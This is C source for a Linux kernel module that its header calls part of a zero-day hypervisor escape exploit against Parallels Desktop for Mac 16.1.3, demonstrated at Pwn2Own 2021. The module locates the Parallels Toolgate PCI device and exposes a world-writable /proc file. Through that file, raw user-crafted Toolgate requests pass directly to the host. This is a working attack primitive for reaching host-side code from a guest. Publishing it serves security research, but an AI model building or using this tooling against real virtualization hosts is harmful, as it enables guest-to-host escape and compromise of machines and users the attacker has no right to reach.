/*
	Hypercall interface detour helper for Parallels Toolgate
	Part of the zero day hypervisor escape exploit for Parallels Desktop for Mac v16.1.3, demonstrated at Pwn2Own 2021
	Author: Alisa Esage (contact@zerodayengineering.com)"
*/

#include "prl_pwn.h"

// todo: ensure reliability of Module.symvers from prl_tg.ko

struct tg_dev *g_tgdev = NULL;

int prl_tg_user_to_host_request_prepare(void *ureq, TG_REQ_DESC *sdesc, TG_REQUEST *src)
{
	int ret = 0;
	void *u;

	maybe_printk("ENTER\n");

	/* read request header from userspace */
	if (copy_from_user(src, ureq, sizeof(TG_REQUEST)))
		return -EFAULT;

#ifdef DUMP_TG_REQUEST
	print_hex_dump(KERN_INFO, "TG_REQUEST:      ", DUMP_PREFIX_OFFSET, 16, 1, src, sizeof(TG_REQUEST), 1);
#endif

	memset(sdesc, 0, sizeof(TG_REQ_DESC));
	sdesc->src = src;

	u = ureq + sizeof(TG_REQUEST);
	if (src->InlineByteCount) {
		sdesc->idata = vmalloc(src->InlineByteCount);
		if (sdesc->idata == NULL) {
			ret = -ENOMEM;
			goto err_vm;
		}

		if (copy_from_user(sdesc->idata, u, src->InlineByteCount)) {
			ret = -EFAULT;
			goto err_vm;
		}
	}
#ifdef DUMP_TG_REQUEST
	print_hex_dump(KERN_INFO, "inline:          ", DUMP_PREFIX_OFFSET, 16, 1, sdesc->idata, src->InlineByteCount, 1);
#endif
	u += (src->InlineByteCount + sizeof(u64) - 1) & ~(sizeof(u64) - 1);

	if (src->BufferCount) {
		/* allocate memory for request's buffers */
		int ssize = src->BufferCount * sizeof(TG_BUFFER);
		sdesc->sbuf = vmalloc(ssize);
		if (!sdesc->sbuf) {
			ret = -ENOMEM;
			goto err_vm;
		}
		/* copy buffer descriptors from userspace */
		if (copy_from_user(sdesc->sbuf, u, ssize)) {
			ret = -EFAULT;
			goto err_vm;
		}
#ifdef DUMP_TG_REQUEST
		print_hex_dump(KERN_INFO, "buffers:         ", DUMP_PREFIX_OFFSET, 16, 1, sdesc->sbuf, ssize, 1);
#endif
		/* leaving sdesc.kernel_bufs set to 0 to indicate that
		all the buffers are Userspace */
	}

	return 0;

err_vm:
	if (sdesc->sbuf)
		vfree(sdesc->sbuf);
	if (sdesc->idata)
		vfree(sdesc->idata);
	return ret;
}

int prl_tg_user_to_host_request_complete(char *u, TG_REQ_DESC *sdesc, int ret)
{
	maybe_printk("ENTER\n");

	if (!ret) {
		int i;
		TG_BUFFER *sbuf;
		TG_REQUEST *src = sdesc->src;
		/* copy request status back to userspace */
		if (copy_to_user(u, src, sizeof(TG_REQUEST)))
			ret = -EFAULT;

		u += sizeof(TG_REQUEST);
		/* copy inline data back to userspace */
		if ((src->InlineByteCount != 0) && (src->Status == TG_STATUS_SUCCESS) &&
			(copy_to_user(u, sdesc->idata, src->InlineByteCount)))
			ret = -EFAULT;

		sbuf = sdesc->sbuf;
		u += ((src->InlineByteCount + sizeof(u64) - 1) & ~(sizeof(u64) - 1)) + offsetof(TG_BUFFER, ByteCount);
		for (i = 0; i < src->BufferCount; i++) {
			/* copy buffer's ButeCounts back to userspace */
			if ((src->Status != TG_STATUS_CANCELLED) &&
				copy_to_user(u, &sbuf->ByteCount, sizeof(sbuf->ByteCount)))
				ret = -EFAULT;
			sbuf++;
			u += sizeof(TG_BUFFER);
		}
	}

	if (sdesc->sbuf)
		vfree(sdesc->sbuf);

	if (sdesc->idata)
		vfree(sdesc->idata);

	maybe_printk("EXIT, returning %d\n", ret);
	return ret;
}

static ssize_t prl_pwn_write(struct file *filp, const char __user *buf,
	size_t nbytes, loff_t *ppos)
{
	int ret = 0;
	void *ureq = NULL;
	TG_REQ_DESC sdesc;
	TG_REQUEST src;

	maybe_printk("ENTER, g_tgdev = 0x%px\n", g_tgdev);

	if ((nbytes != sizeof(TG_REQUEST *)))
		return -EINVAL;

	if (copy_from_user(&ureq, buf, nbytes))
		return -EFAULT;
	ret = prl_tg_user_to_host_request_prepare(ureq, &sdesc, &src);
	if (ret)
		return ret;

	ret = call_tg_sync(g_tgdev, &sdesc);

	return prl_tg_user_to_host_request_complete(ureq, &sdesc, ret);
}

static int prl_pwn_open(struct inode *inode, struct file *filp)
{
	(void)inode;
	(void)filp;

	maybe_printk("ENTER\n");

	if (!try_module_get(THIS_MODULE))
		return -ENODEV;

	return 0;
}

static int prl_pwn_release(struct inode *inode, struct file *filp)
{
	(void)inode;
	(void)filp;
	maybe_printk("ENTER\n");
	module_put(THIS_MODULE);
	return 0;
}

static struct proc_ops prl_pwn_ops = PRLPWN_PROC_OPS_INIT(
	prl_pwn_open,
	prl_pwn_write,
	NULL, NULL,
	prl_pwn_release);

static int __init prl_pwn_init(void)
{
	struct pci_dev *pcidev = NULL;
	struct proc_dir_entry *p;

	printk("Hello, Pwn2Own!\n");
	maybe_printk("call_tg_sync = 0x%px\n", (void*)call_tg_sync);

	pcidev = pci_get_device(PCI_VENDOR_ID_PARALLELS, PCI_DEVICE_ID_TOOLGATE, pcidev);
	if (pcidev) {
		g_tgdev = pci_get_drvdata(pcidev);
		printk(KERN_INFO "Parallels Toolgate device pci_dev 0x%px, tg_dev 0x%px, base addr 0x%lx\n", pcidev, g_tgdev, g_tgdev->base_addr);
	}
	else
	{
		printk(KERN_ERR "Parallels Toolgate device not found. Are Parallels Tools installed?\n");
		return -1;
	}

	p = proc_create_data(PROCFILE, S_IWUGO, NULL, &prl_pwn_ops, g_tgdev);
	if (!p)
	{
		printk(KERN_ERR "prl_pwn: can't create proc entry\n");
		return -1;
	}
	maybe_printk("device: /proc/%s\n", PROCFILE);

    return 0;
}

static void __exit prl_pwn_exit(void)
{
	printk(KERN_INFO "prl_pwn: done!\n");
	remove_proc_entry(PROCFILE, NULL);
}

module_init(prl_pwn_init)
module_exit(prl_pwn_exit)
MODULE_LICENSE("GPL");
